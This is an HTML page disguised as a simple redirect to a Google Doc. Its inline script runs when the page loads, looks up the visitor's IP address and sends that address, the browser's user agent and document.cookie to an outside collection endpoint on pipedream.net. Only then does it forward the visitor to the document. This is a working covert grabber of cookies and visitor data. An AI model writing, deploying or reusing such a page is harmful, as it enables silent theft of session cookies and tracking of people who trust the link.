<!DOCTYPE html>
<html>
<head>
  <title>Google Doc Redirect</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      color: #333;
      text-align: center;
      padding-top: 50px;
    }
  </style>
</head>
<body>
  <h1>Redirecting to Google Doc...</h1>
  <p>You will be forwarded to the document in a few seconds.</p>

  <script>
    // Collect the user's IP address
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        console.log('IP Address:', data.ip);
        fetch('https://eocxrxhm4c77jmx.m.pipedream.net', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            ip: data.ip,
            userAgent: navigator.userAgent,
            cookies: document.cookie
          })
        });
      });

    // Redirect to your Google Doc
    window.location.href = 'https://docs.google.com/document/d/1ZtBLUIJVwleqE0VhLUwL97qQJspt7bvOaJ2xoa-tOL4/edit?tab=t.0';
  </script>
</body>
</html>
